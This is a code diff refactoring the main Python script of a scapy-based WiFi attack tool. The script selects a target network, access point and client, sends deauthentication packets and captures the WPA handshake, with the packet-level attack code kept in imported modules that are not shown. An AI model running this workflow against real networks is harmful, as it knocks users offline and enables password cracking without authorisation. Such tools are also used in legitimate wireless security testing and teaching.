@@ -3,44 +3,47 @@ The main file for our program
 Requires scapy 2.4.2, installable using `pip3 install scapy`
 """
 
-# The main function that will run on program start
-import os
-import signal
-import subprocess
 import sys
 import time
 
 from scapy.layers.dot11 import Dot11FCS
 
-# TODO Find out when this is which
+import utilities
 # Dot11Type = Dot11
+from access_point import AccessPoint
 from ap_sniffer import APSniffer
 from channel_hopper import ChannelHopper
 from deauth_sender import DeauthSender
 from handshake_sniffer import HandshakeSniffer
 
+# TODO Find out when this is which
+from network import Network
+
 Dot11Type = Dot11FCS
 
 # Global used variables
 networks = []  # All found networks (essids)
-sniff_thread = None  # The thread used for sniffing APs
-deauth_thread = None  # The thread used for sending out deauth packages
+threads = set()  # All threads that are used should be addedd to this list
 selected_network = None  # The network to attack
 selected_ap = None  # The access point to attack
 
 
+# The main function that will run on program start
 def main():
-    global iface, selected_network, selected_ap, deauth_thread
+    global iface, selected_network, selected_ap, threads
 
-    require_root()
+    utilities.require_root()
+
+    utilities.initialize_mac_data()
 
     # Capture CTRL-C
     # signal.signal(signal.SIGINT, catch_exceptions)
 
     iface = input("Please specify the interface: ")
-    set_mon_mode("monitor")
+    utilities.set_mon_mode(iface, "monitor")
 
     channel_hopper_thread = ChannelHopper(iface)
+    threads.add(channel_hopper_thread)
     channel_hopper_thread.start()
 
     selected_network = select_network()
@@ -52,8 +55,7 @@ def main():
 
     print("")
     print("You were going to attack the following network and this specific AP:")
-    print(selected_network)
-    print(selected_ap)
+    print(selected_network.essid + " - " + utilities.convert_mac(selected_ap.bssid))
     print("With the following target:")
     print(selected_target)
     print("")
@@ -69,37 +71,48 @@ def main():
 
 # Process for having the user select which Network to attack
 def select_network():
-    global sniff_thread, networks, iface, Dot11Type
+    global threads, networks, iface, Dot11Type
 
     print("")
     print("Please specify the ID of the Network that you want to attack:")
+    print(Network.get_header())
     sniff_thread = APSniffer(iface, networks, Dot11Type, print_new_networks=True)
+    threads.add(sniff_thread)
     sniff_thread.start()
-    network_id = int(input())
 
-    sniff_thread.shutdown = True
+    network_id = int(input())
+    if network_id < 0 or network_id >= len(networks):
+        print("Error: Invalid network selected.")
+        finalize()
+
+    sniff_thread.stop = True
     sniff_thread.join()
 
-    # TODO Check for wrong user input
     print("You selected Network ", network_id)
     return networks[network_id]
 
 
 # Process for having the user select which AP to attack
 def select_ap():
-    global sniff_thread, iface, networks, Dot11Type, selected_network
+    global threads, iface, networks, Dot11Type, selected_network
 
     print("")
     print("Please specify the ID of the AP that you want to attack:")
+    print(AccessPoint.get_header())
     for ap in selected_network.aps:
         print(ap)
-    sniff_thread = APSniffer(iface, networks, Dot11Type, print_new_aps=True, target_network = selected_network)
+    sniff_thread = APSniffer(iface, networks, Dot11Type, print_new_aps=True, target_network=selected_network)
+    threads.add(sniff_thread)
     sniff_thread.start()
-    ap_id = int(input())
 
-    sniff_thread.shutdown = True
+    ap_id = int(input())
+    if ap_id < 0 or ap_id >= len(selected_network.aps):
+        print("Error: Invalid access point selected.")
+        finalize()
+
+    sniff_thread.stop = True
     sniff_thread.join()
-    # TODO Check for wrong user input
+
     print("You selected AP ", ap_id)
     return selected_network.aps[ap_id]
 
@@ -123,7 +136,7 @@ def select_target():
 
 # Sends deauth attacks
 def deauth(target_network, target_client):
-    global iface, deauth_thread
+    global iface
 
     input("Press enter to start sending deauth")
     deauth_start(target_network, target_client)
@@ -132,14 +145,15 @@ def deauth(target_network, target_client):
 
 
 def deauth_start(target_network, target_client):
-    global deauth_thread
+    global threads, deauth_thread
 
     deauth_thread = DeauthSender(iface, selected_ap.bssid, target_client)
+    threads.add(deauth_thread)
     deauth_thread.start()
 
 
 def deauth_stop():
-    global deauth_thread
+    global threads, deauth_thread
 
     deauth_thread.stop = True
     deauth_thread.join()
@@ -147,11 +161,12 @@ def deauth_stop():
 
 # Sniff a handshake
 def sniff_handshake(target_network, target_client):
-    global iface, selected_ap
+    global iface, selected_ap, threads
 
     input("Press enter to start sniffing a handshake")
     deauth_start(target_network, target_client)
     handshake_sniffer_thread = HandshakeSniffer(iface)
+    threads.add(handshake_sniffer_thread)
     handshake_sniffer_thread.start()
 
     time.sleep(3)
@@ -166,61 +181,24 @@ def catch_exceptions(signal, frame):
 
 # Clean up and shut down
 def finalize():
-    print_ap_stats()
-    set_mon_mode("managed")
+    global iface, threads
+
+    # Stop all threads that are still running
+    alive_threads = [thread for thread in threads if thread.isAlive()]
+    for thread in alive_threads:
+        thread.stop = True
+    for thread in alive_threads:
+        if thread.isAlive():
+            thread.join()
+
+    # Put the network card back in managed mode
+    utilities.set_mon_mode(iface, "managed")
+
+    # Print some stats
+    utilities.print_networks_stats(networks)
+
+    # Stop the program
     sys.exit(0)
-
-
-# ---------- UTILITIES ----------
-# Makes dictionary from Wireshark data
-def read_MAC_data():
-    global mac_dict
-    f = open("MACdata.txt", "r")
-    if f.mode == 'r':
-        mac_dict = f.readlines()
-        for l in data:
-            str = l.split()
-            if len(str[0]) == 8:
-                mac_dict[str[0]] = str[1]
-
-
-# Function to look up the vendor of a certain MAC address
-def MAC_lookup(MAC):
-    if MAC[0:8] in mac_dict:
-        return mac_dict[MAC[0:8]]
-    else:
-         return ""
-
-# Prints statistics about the currently captured APs
-def print_ap_stats():
-    global networks
-
-    print("")
-    print("########## STATISTICS ##########")
-    print("Total Networks found: %d" % len(networks))
-    print("Encrypted Networks  : %d" % len([n for n in networks if n.encrypted]))
-    print("Unencrypted Networks: %d" % len([n for n in networks if not n.encrypted]))
-
-
-# Set the interface in a certain mode. Typically monitor or managed
-def set_mon_mode(mode):
-    bash_command("ifconfig " + iface + " down")
-    bash_command("iwconfig " + iface + " mode " + mode)
-    bash_command("ifconfig " + iface + " up")
-
-
-# Execute a bach command
-def bash_command(command):
-    command = command.split()
-    p = subprocess.Popen(command, stdout=subprocess.PIPE)
-    output, err = p.communicate()
-
-
-# Makes sure the script is ran as root
-def require_root():
-    if os.getuid() != 0:
-        print("Please run the script as root!")
-        exit()
 
 
 # Run the script
